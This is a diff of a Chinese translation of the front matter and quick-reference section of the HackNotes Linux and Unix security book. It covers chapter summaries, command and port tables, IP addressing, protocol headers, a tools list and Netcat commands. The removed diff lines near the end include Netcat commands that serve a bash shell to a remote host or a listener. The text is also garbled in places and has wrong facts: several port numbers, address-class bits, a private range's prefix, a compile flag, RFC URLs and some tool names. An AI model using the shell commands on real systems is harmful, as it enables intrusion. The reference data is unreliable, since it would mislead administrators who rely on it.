@@ -1,19 +1,10 @@
+
 # HackNotes - Linux 与 Unix 安全便携式参考
-
-
-
-
-
-
-
-
 
 - 学习黑客如何入侵 Linux 和 Unix 系统
 - 保护您的系统免受最复杂黑客的攻击
 - 获取关于 Linux 和 Unix 安全工具及最佳实践的简洁概述
 - 防御高级侵入策略，如缓冲区溢出攻击、端口重定向、网络嗅探等
-
-
 
 > “触手可及的虚拟武器库。**HackNotes Linux 和 Unix 安全便携指南**对于忙碌的管理员和顾问来说是一份非常有价值的参考，他们需要简洁且实用的见解，来理解他们面临的威胁以及如何实际利用工具测试环境的安全。”
 
@@ -27,26 +18,13 @@
 
 —Snax，The Shmo Group，AirSnort 维护者
 
-
-
-
-
-
-
-
-
-
 Athena Honore
-
 插画
 Kathleen Fay Edwards
 
-
-
-
 # 关于作者
 
-# Nitesh Dhanjani
+## Nitesh Dhanjani
 
 Nitesh Dhanjani 是 Foundstone, Inc. 的信息安全顾问。在 Foundstone 期间，Nitesh 参与了针对各种财富 500 强公司的多种项目，包括网络、主机渗透和安全评估，以及安全架构服务。Nitesh 是《HackNotes: Network Security Portable Reference》（McGraw-Hill/Osborne, 2003）的贡献作者，也是畅销书《Hacking Exposed: Network Security and Solutions》（McGraw-Hill/Osborne, 2003）最新版的作者之一。他还在《Linux Journal》等技术出版物上发表文章。除了写作外，他还教授过 Foundstone 的“终极黑客：专家”和“终极黑客”课程。
 
@@ -54,13 +32,9 @@ Nitesh Dhanjani 是 Foundstone, Inc. 的信息安全顾问。在 Foundstone 期�
 
 # 关于评审员
 
-# Robert Clugston
+## Robert Clugston
 
 Robert Clugston 是 Foundstone 的信息技术顾问。他在系统管理、网络安全和 Web 制作方面拥有六经验。Robert 最初加入 Foundstone 是为了设计和保护 Foundstone 的网站，现在专注于为 Foundstone 的客户提供服务。在加入 Foundstone 之前，Robert 曾担任互联网服务提供商的系统管理员。职责包括部署、维护和保护业务关键系统，涵盖 Web 服务器、路由器、DNS 服务器、邮件服务器以及额外的接入系统。在加入 Foundstone 之前，Robert 曾短时间担任专门从事 Perl/PHP 开发的独立承包商。Robert 拥有 Windows NT MSCE 学位。
-
-
-
-
 
 # 第一部分
 
@@ -68,37 +42,17 @@ Robert Clugston 是 Foundstone 的信息技术顾问。他在系统管理、网�
 
 - ■ 1 足迹扫描（Footprinting）............................................................... 3
 
-
-
-
-
 # HackNotes Linux 与 Unix 安全便携参考
-
-
-
-
-
-
 
 ## 第二部分 主机加固
 
-   设置密码策略 ................................................... 132
-
-
+设置密码策略 ................................................... 132
 
 ## 第三部分 特殊主题
 
-
-
-   Keypebble VNC Viewer ............................................................................................................................................................................................................................................................................................................ 183
-
-
-
-
+Keypebble VNC Viewer ............................................................................................................................................................................................................................................................................................................ 183
 
 # HackNotes Linux 与 Unix 安全便携参考指南
-
-
 
 # 谢谢
 
@@ -135,11 +89,13 @@ HackNotes 系列书籍的设计旨在易于随身携带或放入电脑包中，�
 书中使用的图标使得导航非常容易。每种黑客技术或攻击都用特殊的剑图标标出。
 
 > 此图标代表一种黑客技术或攻击
+
 > 详细了解黑客入侵漏洞系统时使用的各种技术和战术。
 
 每种黑客技术或攻击在可能的情况下都有相应的防御措施，该措施也有自己的特殊盾牌图标。
 
 - 此图标代表应对黑客技术和攻击的防御步骤
+
 > 详细了解如何防御所展示的客技术或攻击的简洁细节。
 
 书中还使用了其他特殊元素。这个“i”图标代表应该记住的信息和提示。
@@ -169,6 +125,8 @@ root
 
 # HackNotes Linux 与 Unix 安全便携参考
 
+
+
 不要担心黑客获取书中介绍的内容。他们已经知道了。本书的意图是暴露今天使用的战术，以便你学会防御。一旦你理解了黑客如何思考以及他们入侵系统的各种方法，优势将属于你。
 
 # 本书结构
@@ -184,244 +142,312 @@ root
 - **第三章** 学习黑客如何识别远程主机上运行的应用程序和服务。本章将向你展示入侵者用于枚举用户名和远程服务的许多不同工具和方法。
 - **第四章** 本章暴露了黑客获取漏洞主机访问的事实和战术。学习黑客使用的最精的技术，例如暴力破解、嗅探、中间人攻击、密码破解、端口重定向、针对配置错误的利用、缓冲区溢出以及许多其他软件漏洞。
 - **第五章** 通常，利用特定漏洞会获得黑客对特权用户或系统账户的访问。在这种情况下，黑客的下一个逻辑步骤是获取超级用户（root）权限。本章向你展示了黑客尝试获取更高权限的多种方法。
-
-
-
-
-
-# 第6章 一旦主机被攻破，黑客就会想要隐藏其踪迹并确保对主机的持续特权访问。本章将向你展示黑客如何通过清理日志文件来隐藏踪迹，以及黑客如何在被攻破的主机上安装木马、后门和根内核。
+- **第6章** 一旦主机被攻破，黑客就会想要隐藏其踪迹并确保对主机的持续特权访问。本章将向你展示黑客如何通过清理日志文件来隐藏踪迹，以及黑客如何在被攻破的主机上安装木马、后门和根内核。
 
 ## 第二部分：主机加固
 
 本书的第二部分侧重于系统管理员可以采取的许多步骤，以加固默认系统配置和策略。
 
-# 第7章 本章讨论了与默认应用程序和服务器配置加固相关的的重要配置问题。强烈建议所有系统管理员考虑本章提出的建议，以防止入侵者利用脆弱的系统策略和配置。
+### 第7章
+本章讨论了与默认应用程序和服务器配置加固相关的的重要配置问题。强烈建议所有系统管理员考虑本章提出的建议，以防止入侵者利用脆弱的系统策略和配置。
 
-# 第8章 恶意用户和黑客经常利用不当的用户和文件系统权限。本章将向你介绍 Unix 和 Linux 文件权限，并教你采取哪些精确的步骤以防止由于用户和文件系统权限不当导致被攻破。
+### 第8章
+恶意用户和黑客经常利用不当的用户和文件系统权限。本章将向你介绍 Unix 和 Linux 文件权限，并教你采取哪些精确的步骤以防止由于用户和文件系统权限不当导致被攻破。
 
-# 第9章 每位系统管理员都应该执行正确的系统事件日志记录。本章教你如何启用和配置日志服务，以及如何正确设置日志文件的权限以防止被篡改。此外，保持最新的安全补丁也非常重要，本章提供了获取这些补丁的供应商网站链接。
+### 第9章
+每位系统管理员都应该执行正确的系统事件日志记录。本章教你如何启用和配置日志服务，以及如何正确设置日志文件的权限以防止被篡改。此外，保持最新的安全补丁也非常重要，本章提供了获取这些补丁的供应商网站链接。
 
-# 第三部分：特殊主题
+## 第三部分：特殊主题
 
 本书的第三部分汇总了一些精彩的话题，从 Nessus 扫描器的插件到无线攻击，再到使用 Zaurus PDA 进行攻击。
 
-# 第10章 Nessus 是目前最流行的漏洞扫描工具之一。它是免费的且设计上高度模块化。本章将教你如何使用 NASL（Nessus 攻击脚本语言）为 Nessus 扫描器编写自定义漏洞检查插件。
+### 第10章
+`Nessus` 是目前最流行的漏洞扫描工具之一。它是免费的且设计上高度模块化。本章将教你如何使用 `NASL`（Nessus 攻击脚本语言）为 `Nessus` 扫描器编写自定义漏洞检查插件。
 
-# 第11章 学习黑客如何渗透 802.11 无线网络。本章讲解了 WEP 协议的弱性，并介绍了黑客用于利用无线网络的工具。此外，本章还提供了关于如何更好地保护无线网络的建议和指导。
+### 第11章
+学习黑客如何渗透 `802.11` 无线网络。本章讲解了 `WEP` 协议的弱性，并介绍了黑客用于利用无线网络的工具。此外，本章还提供了关于如何更好地保护无线网络的建议和指导。
 
+### 第12章
+`Sharp Zaurus` PDA 设备运行嵌入版本的 Linux 操作系统。本章将向你展示适用于 `Zaurus` PDA 的各种可用安全工具，以及黑客如何轻松地使用它们来渗透无线网络。
 
-# 第12章 Sharp Zaurus PDA 设备运行嵌入版本的 Linux 操作系统。本章将向你展示适用于 Zaurus PDA 的各种可用安全工具，以及黑客如何轻松地使用它们来渗透无线网络。
-
-
-
-# 读者
+## 读者
 
 本书的制作投入了巨大的心血。我希望你发现其中包含材料是有见且实用的。最重要的是，我希望你将书中呈现的信息用于善意，保护并确保你的系统和网络免受最复杂的黑客的攻击。
 
+- 邮件列表 ........................................................................ RC 19
+- 会议与活动 ........................................................ RC 19
 
-  - 邮件列表 ........................................................................ RC 19
-  - 会议与活动 ........................................................ RC 19
+本节提供了请求最多且实用的材料。记住，当你需要快速获取常用命令、常用端口、在线资源、IP 地址和实用的 `Netcat` 命令等主题的信息时，只需翻到这一章。此外，还提供了 ASCII 码、HTTP 服务器响应表以及重要文件的权限。
 
-
-本节提供了请求最多且实用的材料。记住，当你需要快速获取常用命令、常用端口、在线资源、IP 地址和实用的 Netcat 命令等主题的信息时，只需翻到这一章。此外，还提供了 ASCII 码、HTTP 服务器响应表以及重要文件的权限。
-
-# 常用命令
+### 常用命令
 
 以下是大多数 Unix 和 Linux 发行版精简安装中常见的最常用命令列表。如需了解特定命令的更多信息，请通过输入 `command` 查看其手册页。
 
 | 命令 | 描述 |
 | --- | --- |
-| alias | 设置并查看命令别名。 |
-| arch | 打印机器架构。 |
-| awk | 模式扫描和处理语言。 |
-| bash | Bourne Again Shell。 |
-| bg | 将在前台运行的进程移到后台。 |
-| biff | 当邮件到达时通知。 |
-| cat | 合并并打印文件。 |
-| cd | 切换目录。 |
-| chage | 更改用户密码过期信息。 |
-| chgrp | 组所有权。 |
-| chmod | 修改文件权限。 |
-| chown | 更改文件和组所有者。 |
-| chroot | 在特殊的根目录下运行命令。 |
-| chsh | 更改登录 shell。 |
-| clear | 清除终端屏幕。 |
-| cp | 复制文件和目录。 |
-| crontab | 维护 crontab 文件。 |
+| `alias` | 设置并查看命令别名。 |
+| `arch` | 打印机器架构。 |
+| `awk` | 模式扫描和处理语言。 |
+| `bash` | Bourne Again Shell。 |
+| `bg` | 将在前台运行的进程移到后台。 |
+| `biff` | 当邮件到达时通知。 |
+| `cat` | 合并并打印文件。 |
+| `cd` | 切换目录。 |
+| `chage` | 更改用户密码过期信息。 |
+| `chgrp` | 组所有权。 |
+| `chmod` | 修改文件权限。 |
+| `chown` | 更改文件和组所有者。 |
+| `chroot` | 在特殊的根目录下运行命令。 |
+| `chsh` | 更改登录 shell。 |
+| `clear` | 清除终端屏幕。 |
+| `cp` | 复制文件和目录。 |
+| `crontab` | 维护 crontab 文件。 |
 
-## 常用命令 RC 3
-
-| 命令 | 描述 |
-|---|---|
-| csh | C shell。 |
-| cut | 删除文件中每行的部分。 |
-| date | 打印或设置系统日期和时间。 |
-| dd | 转换并复制文件。 |
-| df | 打印文件系统磁盘使用情况。 |
-| diff | 查找文件之间的差异。 |
-| dig | DNS（域名系统）查询工具。 |
-| dmesg | 打印系统缓冲区中的诊断信息。 |
-| dnsdomainname | 显示系统的 DNS（域名系统）域名。 |
-| domainname | 显示系统的 NIS（网络信息系统）或 YP（黄页）名称。 |
-| du | 估算文件空间使用情况。 |
-| echo | 显示一行文本。 |
-| env | 在修改的环境中运行程序。 |
-| false | 以失败的状态码退出。 |
-| fdisk | 磁盘分区表操。 |
-| fg | 将在后台运行的进程移到前台。 |
-| file | 确定文件类型。 |
-| find | 在目录层次中搜索文件。 |
-| free | 显示空闲和已用内存。 |
-| ftp | FTP 客户端。 |
-| fuser | 识别使用文件或套接字的进程。 |
-| gcc | GNU C 和 C++ 编译器。 |
-| grep | 打印匹配给定模式的行。 |
-| groupadd | 创建新组。 |
-| groupdel | 删除组。 |
-| groupmod | 修改组。 |
-| groups | 打印用户所属的所有组。 |
-
-参考常用命令
-
-## RC 4 参考中心
+#### 常用命令 RC 3
 
 | 命令 | 描述 |
 |---|---|
-| gunzip | 解压缩使用 Lempel 编码的文件。 |
-| gzip | 使用 Lempel 编码压缩文件。 |
-| host | DNS（域名系统）查询工具。 |
-| hostname | 显示或设置主机名。 |
-| id | 打印真实有效用户 ID 和组 ID。 |
-| ifconfig | 配置网络接口。 |
-| kill | 终止进程。 |
-| ksh | Korn shell。 |
-| last | 显示最后登录用户列表。 |
-| lastlog | 显示账户最后登录时间。 |
-| ln | 在文件创建链接。 |
-| ls | 列出目录内容。 |
-| mail | 发送和接收邮件。 |
-| man | 格式化并显示手册页。 |
-| mesg | 控制终端写入权限。 |
-| mkdir | 创建目录。 |
-| more | 逐屏显示文件内容。 |
-| mount | 挂载文件系统。 |
-| mv | 移动并重命名文件和目录。 |
-| netstat | 打印网络连接、路由表、接口统计、伪装连接和组播成员。 |
-| nice | 以修改的调度优先级运行程序。 |
-| nslookup | 查询域名服务器。 |
-| passwd | 更改登录和密码属性。 |
-| ping | 向网络主机发送 ICMP ECHO 请求。 |
-| ps | 报告进程状态。 |
-| pwd | 打印工作目录名称。 |
-| quota | 显示磁盘使用情况和限制。 |
+| `csh` | C shell。 |
+| `cut` | 删除文件中每行的部分。 |
+| `date` | 打印或设置系统日期和时间。 |
+| `dd` | 转换并复制文件。 |
+| `df` | 打印文件系统磁盘使用情况。 |
+| `diff` | 查找文件之间的差异。 |
+| `dig` | DNS（域名系统）查询工具。 |
+| `dmesg` | 打印系统缓冲区中的诊断信息。 |
+| `dnsdomainname` | 显示系统的 DNS（域名系统）域名。 |
+| `domainname` | 显示系统的 NIS（网络信息系统）或 YP（黄页）名称。 |
+| `du` | 估算文件空间使用情况。 |
+| `echo` | 显示一行文本。 |
+| `env` | 在修改的环境中运行程序。 |
+| `false` | 以失败的状态码退出。 |
+| `fdisk` | 磁盘分区表操。 |
+| `fg` | 将在后台运行的进程移到前台。 |
+| `file` | 确定文件类型。 |
+| `find` | 在目录层次中搜索文件。 |
+| `free` | 显示空闲和已用内存。 |
+| `ftp` | FTP 客户端。 |
+| `fuser` | 识别使用文件或套接字的进程。 |
+| `gcc` | GNU C 和 C++ 编译器。 |
+| `grep` | 打印匹配给定模式的行。 |
+| `groupadd` | 创建新组。 |
+| `groupdel` | 删除组。 |
+| `groupmod` | 修改组。 |
+| `groups` | 打印用户所属的所有组。 |
 
 参考常用命令
 
+#### RC 4 参考中心
 
+| 命令 | 描述 |
+|---|---|
+| `gunzip` | 解压缩使用 Lempel 编码的文件。 |
+| `gzip` | 使用 Lempel 编码压缩文件。 |
+| `host` | DNS（域名系统）查询工具。 |
+| `hostname` | 显示或设置主机名。 |
+| `id` | 打印真实有效用户 ID 和组 ID。 |
+| `ifconfig` | 配置网络接口。 |
+| `kill` | 终止进程。 |
+| `ksh` | Korn shell。 |
+| `last` | 显示最后登录用户列表。 |
+| `lastlog` | 显示账户最后登录时间。 |
+| `ln` | 在文件创建链接。 |
+| `ls` | 列出目录内容。 |
+| `mail` | 发送和接收邮件。 |
+| `man` | 格式化并显示手册页。 |
+| `mesg` | 控制终端写入权限。 |
+| `mkdir` | 创建目录。 |
+| `more` | 逐屏显示文件内容。 |
+| `mount` | 挂载文件系统。 |
+| `mv` | 移动并重命名文件和目录。 |
+| `netstat` | 打印网络连接、路由表、接口统计、伪装连接和组播成员。 |
+| `nice` | 以修改的调度优先级运行程序。 |
+| `nslookup` | 查询域名服务器。 |
+| `passwd` | 更改登录和密码属性。 |
+| `ping` | 向网络主机发送 ICMP ECHO 请求。 |
+| `ps` | 报告进程状态。 |
+| `pwd` | 打印工作目录名称。 |
+| `quota` | 显示磁盘使用情况和限制。 |
 
+参考常用命令
 
-
-## 常用命令 RC5
+#### 常用命令 RC5
 
 | 命令 | 描述 |
 | --- | --- |
-| quotaoff | 关闭文件系统配额。 |
-| quotaon | 开启文件系统配额。 |
-| repquota | 总结文件系统的配额。 |
-| rm | 删除文件或目录。 |
-| rmdir | 删除空目录。 |
-| route | 显示或操作路由表。 |
-| rpcinfo | 报告 RPC（远程过程调用）信息。 |
-| sed | 流式编辑器。 |
-| setquota | 设置磁盘配额。 |
-| showmount | 显示 NFS（网络文件系统）的挂载信息。 |
-| shutdown | 关闭系统。 |
-| sleep | 延迟指定的时间。 |
-| sort | 对文件行进行排序。 |
-| strace | 跟踪系统调用和信号。 |
-| strings | 输出文件中中的可打印字符。 |
-| su | 使用替换的用户和组 ID 运行 shell。 |
-| tail | 输出文件的最后部分。 |
-| tar | 归档工具。 |
-| tcsh | 具有文件名补全和命令编辑功能的 C shell。 |
-| telnet | Telnet 客户端。 |
-| tftp | TFTP（简单文件传输协议）客户端。 |
-| traceroute | 打印数据包通往目标主机经过的路径。 |
-| true | 以表示成功的状态码退出。 |
-| umount | 卸载文件系统。 |
-| uname | 打印系统信息。 |
-| useradd | 创建新用户。 |
-| userdel | 删除用户账户。 |
-| uptime | 打印系统运行了多久。 |
-| vi | 编辑器。 |
-| w | 显示登录的用户及其正在的操作。 |
+| `quotaoff` | 关闭文件系统配额。 |
+| `quotaon` | 开启文件系统配额。 |
+| `repquota` | 总结文件系统的配额。 |
+| `rm` | 删除文件或目录。 |
+| `rmdir` | 删除空目录。 |
+| `route` | 显示或操作路由表。 |
+| `rpcinfo` | 报告 RPC（远程过程调用）信息。 |
+| `sed` | 流式编辑器。 |
+| `setquota` | 设置磁盘配额。 |
+| `showmount` | 显示 NFS（网络文件系统）的挂载信息。 |
+
+
+
+| `shutdown` | 关闭系统。 |
+
+| `sleep` | 延迟指定的时间。 |
+
+| `sort` | 对文件行进行排序。 |
+
+| `strace` | 跟踪系统调用和信号。 |
+
+| `strings` | 输出文件中中的可打印字符。 |
+
+| `su` | 使用替换的用户和组 ID 运行 shell。 |
+
+| `tail` | 输出文件的最后部分。 |
+
+| `tar` | 归档工具。 |
+
+| `tcsh` | 具有文件名补全和命令编辑功能的 C shell。 |
+
+| `telnet` | Telnet 客户端。 |
+
+| `tftp` | TFTP（简单文件传输协议）客户端。 |
+
+| `traceroute` | 打印数据包通往目标主机经过的路径。 |
+
+| `true` | 以表示成功的状态码退出。 |
+
+| `umount` | 卸载文件系统。 |
+
+| `uname` | 打印系统信息。 |
+
+| `useradd` | 创建新用户。 |
+
+| `userdel` | 删除用户账户。 |
+
+| `uptime` | 打印系统运行了多久。 |
+
+| `vi` | 编辑器。 |
+
+| `w` | 显示登录的用户及其正在的操作。 |
 
 参考中心常用命令
 
 | 命令 | 描述 |
+
 | --- | --- |
-| wall | 向每个用户的终端发送消息。 |
-| wc | 打印文件的字节数、单词数和行数。 |
-| whereis | 定位命令的二进制文件、源码和手册页文件。 |
-| which | 显示命令的完整路径。 |
-| who | 显示登录的用户。 |
-| whoami | 打印有效用户 ID。 |
-| write | 向另一个用户发送消息。 |
-| ypdomainname | 显示或设置系统的 NIS（网络信息系统）或 YP（黄页）域名。 |
+
+| `wall` | 向每个用户的终端发送消息。 |
+
+| `wc` | 打印文件的字节数、单词数和行数。 |
+
+| `whereis` | 定位命令的二进制文件、源码和手册页文件。 |
+
+| `which` | 显示命令的完整路径。 |
+
+| `who` | 显示登录的用户。 |
+
+| `whoami` | 打印有效用户 ID。 |
+
+| `write` | 向另一个用户发送消息。 |
+
+| `ypdomainname` | 显示或设置系统的 NIS（网络信息系统）或 YP（黄页）域名。 |
 
 # 常用端口
 
 以下是与最常用的 Unix 和 Linux 服务对应的端口名称和服务列表。
 
-> 如需更完整的列表，请参阅 /etc/services 文件。
+> 如需更完整的列表，请参阅 `/etc/services` 文件。
 
 | 服务 | 端口 |
+
 | --- | --- |
+
 | Echo | 7 |
+
 | Daytime | 13 |
+
 | qotd (每日格言) | 17 |
+
 | FTP-data | 20 |
+
 | FTP | 21 |
+
 | SSH | 22 |
+
 | Telnet | 23 |
+
 | SMTP (简单邮件传输协议) | 25 |
+
 | Time server | 37 |
+
 | Whois | 43 |
+
 | DNS (域名系统) | 53 |
+
 | TFTP (简单文件传输协议) | 69 |
+
 | Finger | 79 |
+
 | HTTP (超文本传输传输协议) | 80 |
+
 | POP2 (邮局协议 2) | 109 |
+
 | POP3 (邮局协议 3) | 110 |
+
 | Portmapper | 111 |
+
 | Ident | 113 |
+
 | NNTP (网络新闻传输协议) | 119 |
+
 | NTP (网络时间协议) | 123 |
+
 | Samba | 137–139 |
+
 | IMAP2 (Internet消息访问协议) | 143 |
+
 | SNMP (简单网络管理协议) | 161 |
 
 | 服务 | 端口 |
+
 | --- | --- |
+
 | BGP (边界网关协议) | 179 |
+
 | IMAP3 (Internet消息访问协议) | 220 |
+
 | LDAP (轻级目录访问协议) | 389 |
+
 | HTTPS (安全超文本传输协议) | 443 |
+
 | rlogin | 513 |
+
 | rsh | 514 |
+
 | Line printer (lpr) | 515 |
+
 | Talk | 517 |
+
 | Time server | 525 |
+
 | NNTP (网络新闻传输协议) | 563 |
+
 | IPP (打印协议) | 631 |
+
 | LDAPS (安全轻级目录访问协议) | 636 |
+
 | IMAPS (安全消息访问协议) | 993 |
+
 | POP3 (安全邮局协议) | 995 |
+
 | NFS (网络文件系统) | 2049 |
+
 | MySQL | 3300 |
+
 | VNC (虚拟计算) | 5900 |
+
 | SSH (安全外壳) | 5900+ |
+
 | X1 | 6063 |
+
 | XFS (安全文件系统) | 7100 |
 
 # IP 地址
@@ -431,10 +457,13 @@ root
 ### 点进制表示法
 
 IP 地址长度为 32 位，例如：
+
 ```
 11000000 10101000 00000001 00000001
 ```
+
 为了便于读读，IP 地址使用点进制表示，例如：
+
 ```
 192.168.1.1
 ```
@@ -448,10 +477,13 @@ IP 地址被分为五类，分配给不同规模的网络。
 A 类分配给具有大量主机机的大型组织。注意 A 类地址经常被浪费。
 
 | 类 | 位数 |
+
 | --- | --- |
+
 | 0 | 8 |
 
 - **第一个字节**：始终为 0。
+
 - **最大网络数**：由第一个字节表示。因此可能有 $2^{24}-2=16,777,214$ 个主机。
 
 ### B 类
@@ -459,10 +491,13 @@ A 类分配给具有大量主机机的大型组织。注意 A 类地址经常被
 B 类分配给具有大量网络和主机的组织。
 
 | 类 | 位数 |
+
 | --- | --- |
+
 | 01 | 16 |
 
 - **第一个字节**：前两位为 01。
+
 - **最大网络数**：由前两个字节表示。因此可能有 $2^{14}=16,384$ 个 B 类网络。
 
 ### C 类
@@ -470,11 +505,15 @@ B 类分配给具有大量网络和主机的组织。
 C 类用于具有少量主机的组织。
 
 | 类 | 位数 |
+
 | --- | --- |
+
 | 010 | 24 |
 
 - **第一个字节**：前三位为 010。
+
 - **最大网络数**：由第一个、第二个和第三个字节表示。因此可能有 $2^{21}=2,097,152$ 个 C 类网络。
+
 - **每个网络最大主机**：由最后一个字节表示。因此每个网络可能有 $2^8-2=254$ 个主机。
 
 ### D 类
@@ -482,7 +521,9 @@ C 类用于具有少量主机的组织。
 D 类是一个预留类，用于向一组主机发送组播消息。
 
 | 类 | 位数 |
+
 | --- | --- |
+
 | 1110 | 4 |
 
 - **第一个字节**：范围从 224 到 239。前四位为 1, 1, 1 和 0。
@@ -492,7 +533,9 @@ D 类是一个预留类，用于向一组主机发送组播消息。
 E 类是一个预留类。互联网上没有分配属于该类的 IP 地址。
 
 | 类 | 位数 |
+
 | --- | --- |
+
 | 11110 | 5 |
 
 - **第一个字节**：范围从 240 到 255。前五位为 1, 1, 1, 1 和 0。
@@ -504,6 +547,7 @@ E 类是一个预留类。互联网上没有分配属于该类的 IP 地址。
 ```
 11111111 11111111 00000000 00000000
 ```
+
 前面的掩码在点进制表示中为 255.255.255.0。
 
 ### CIDR (无类域间路由)
@@ -516,13 +560,13 @@ CIDR 地址是为了满足这种增长的需求设计的，采用以下表示法
 PREFIX/mask
 ```
 
-其中 PREFIX 是 IP 地址前缀，mask 是掩码的长度。例如：
+其中 `PREFIX` 是 IP 地址前缀，`mask` 是掩码的长度。例如：
 
 ```
 192.168.1.0/24
 ```
 
-在这里，PREFIX 长度为 24 位，而后缀是剩余 8 位。因此，此 CIDR 类将包含以下地址：192.168.1.0–192.168.1.255。
+在这里，`PREFIX` 长度为 24 位，而后缀是剩余 8 位。因此，此 CIDR 类将包含以下地址：192.168.1.0–192.168.1.255。
 
 ### 回环
 
@@ -531,13 +575,17 @@ PREFIX/mask
 ```
 127.0.0.0/8
 ```
+
 该范围用于指定本地主机的回环地址。发送到此范围内地址的数据包将返回主机。注意，目标为回环范围地址的数据包不会传播硬件网络设备，因此不会被放在物理网络线上。
 
 ### 私有地址
 
 互联网分配数字机构 (IANA) 为私有网络保留了以下三个 IP 段：
+
 - 10.0.0.0–10.255.255.255 (CIDR 表示法: 10.0.0.0/8)
+
 - 172.16.0.0–172.31.255.255 (CIDR 表示法: 172.16.0.0/16)
+
 - 192.168.0.0–192.168.255.255 (CIDR 表示法: 192.168.0.0/16)
 
 ## 协议头
@@ -548,26 +596,38 @@ RFC（请求意见）文档提供了 TCP/IP 协议实现的详细信息。这些
 
 以下表示了 IP 头的布局。头部顶部的数字每个代表一个字节。
 
-
-
-
-
 ### IP 地址分配 RC 13
 
 | 0 1 2 3 |
+
 | 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 |
+
 | +------------------------------------------------------ |
+
 | 版本 (Version) | 头部长度 (IHL) | 服务类型 (Type of Service) | 总长度 (Total Length) |
+
 | +------------------------------------------------------ |
+
+
+
 | 标识符 (Identification) | 标志 (Flags) | 分片偏移 (Fragment Offset) |
+
 | +------------------------------------------------------ |
+
 | 生存时间 (Time to Live) | 协议 (Protocol) | 头部校验和 (Header Checksum) |
+
 | +------------------------------------------------------ |
+
 | 源地址 (Source Address) |
+
 | +------------------------------------------------------ |
+
 | 目的地址 (Destination Address) |
+
 | +------------------------------------------------------ |
+
 | 选项 (Options) | 填充 (Padding) |
+
 | +------------------------------------------------------ |
 
 通常，IP 头部不包含选项（Options）字段，因此长度为 20 字节。当存在选项字段时，其实际长度由总长度（Total Length）字段表示，该字段包含整个数据包（头部和数据）的长度。详情请参见 RFC 791：http://www.faqs.org/rcfs/rfc791.html。
@@ -577,23 +637,41 @@ RFC（请求意见）文档提供了 TCP/IP 协议实现的详细信息。这些
 数据包都封装在 IP 数据包的数据（Data）字段中，该字段紧随 IP 头部之后。以下是 TCP 部的布局。请注意头部顶部的数字每个代表一个字节。
 
 | 0 1 2 3 |
+
 | 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 |
+
 | +------------------------------------------------------ |
+
 | 源端口 (Source Port) | 目的端口 (Destination Port) |
+
 | +------------------------------------------------------ |
+
 | 序列号 (Sequence Number) |
+
 | +------------------------------------------------------ |
+
 | 确认序列号 (Acknowledgment Number) |
+
 | +------------------------------------------------------ |
+
 | 数据 (Data) | U A P R S F | 窗口 (Window) |
+
 | 偏移 (Offset) | 预留 (Reserved) | C R S S Y I |
+
 | | G K H T N N |
+
 | +------------------------------------------------------ |
+
 | 校验和 (Checksum) | 紧急指针 (Urgent Pointer) |
+
 | +------------------------------------------------------ |
+
 | 选项 (Options) | 填充 (Padding) |
+
 | +------------------------------------------------------ |
+
 | 数据 |
+
 | +------------------------------------------------------ |
 
 详情请参见 RFC 793：http://www.faqs.org/rcfs/rfc793.html。
@@ -657,23 +735,25 @@ RFC（请求意见）文档提供了 TCP/IP 协议实现的详细信息。这些
 | Stunnel | 创建安全隧道 | http://www.stunnel.org/ |
 | Tcpdump | 数据包嗅探器 | http://www.tcpdump.org/ |
 | Tornkit | Rootkit 工具 | http://www.tornkit.org/ |
-
 | 名称 | 描述 | 位置 |
 |---|---|---|
 | Wget | 命令行客户端 | http://wget.org/ |
 | Airirc | 破解 802.11 | http://www.airirc.com/ |
 | Vuln | 漏洞列表 | http://www.vulncheck.org/ |
 | Wiresh-ng | 命令行工具 | http://www.wi.com/ |
+
+
+
+# RC 20 参考中心
+
+## 远程工具
+
 | Xprobe | 远程工具 | http://www.xprobe.org/ |
 | Xremote | 远程工具 | http://www.xremote.org/ |
 | Xscan | 远程工具 | http://www.xscan.org/ |
 | Xwin | 远程工具 | http://www.xwin.org/ |
 | Vncrack | 暴力破解 | http://www.vncrack.org/ |
 | Zebedee | 安全隧道 | http://www.zebedee.org/ |
-
-
-
-
 
 ## 邮件列表
 
@@ -697,33 +777,31 @@ RFC（请求意见）文档提供了 TCP/IP 协议实现的详细信息。这些
 | CSI (计算机安全协会) | http://www.gocsi.com/ |
 | RSA | http://www.rsasecurity.com/company/events/index.html |
 
-## RC 20 参考中心
-
-# 有用的 NETCAT 命令
+## 有用的 NETCAT 命令
 
 Netcat 是一种使用 TCP 和 UDP 协议在网络上读写数据的命令行工具。由于它可以执行许多不同的功能，因此它被称为“网络界的瑞士军刀”。下表提供了最实用的 Netcat 命令的快速使用指南。
 
-> Netcat 默认使用 TCP 协议。在下表中的许多命令可以使用 -u 标志来让 Netcat 使用 UDP 代替 TCP。
+> Netcat 默认使用 TCP 协议。在下表中的许多命令可以使用 `-u` 标志来让 Netcat 使用 UDP 代替 TCP。
 
 | 描述 | 命令 |
 | --- | --- |
-| 连接到远程主机上的端口 | nc remote_host <port> |
-| 连接到远程主机上的多个端口 | nc remote_host <port>...<port><br>例如：<br>nc www.somecompanyanample.com 21 25 80 |
-| 监听端口以等待传入连接 | nc -v -l -p <port> |
-| 连接到远程主机并提供 bash shell 服务 | nc remote_ip <port> -e /bin/bash<br>注意：Netcat 默认不支持 -e 标志。要使 Netcat 支持 -e 标志，必须使用 D__SECURITY_HOLE 选项重新编译 |
-| 监听端口并在连接时提供 bash shell 服务 | nc -v -l -p <port> -e /bin/bash<br>注意：Netcat 默认不支持 -e 标志。要使 Netcat 支持 -e 标志，必须使用 DAGING_SECURITY_HOLE 选项重新编译 |
-| 对远程主机进行端口扫描 | nc -v -z remote_host <port>-<port><br>使用 -l 标志来设置延迟间隔：<br>nc -i <seconds> -v -z remote_host <port>-<port> |
-| 将命令输出通过传输到 netcat 请求 | <command> | nc remote_host <port><br>例如：<br>echo "GET / HTTP/1.0<br>[enter]<br>[enter>" | nc www.somecompanyanample.com 80 |
-| 使用源路由连接到远程主机上的端口 | nc -g <gateway> remote_host <port><br>注意：可以使用 -g 标志指定最多八个高点。使用 -G 标志指定源路由指针 |
+| 连接到远程主机上的端口 | `nc remote_host <port>` |
+| 连接到远程主机上的多个端口 | `nc remote_host <port>...<port>`<br>例如：<br>`nc www.somecompanyanample.com 21 25 80` |
+| 监听端口以等待传入连接 | `nc -v -l -p <port>` |
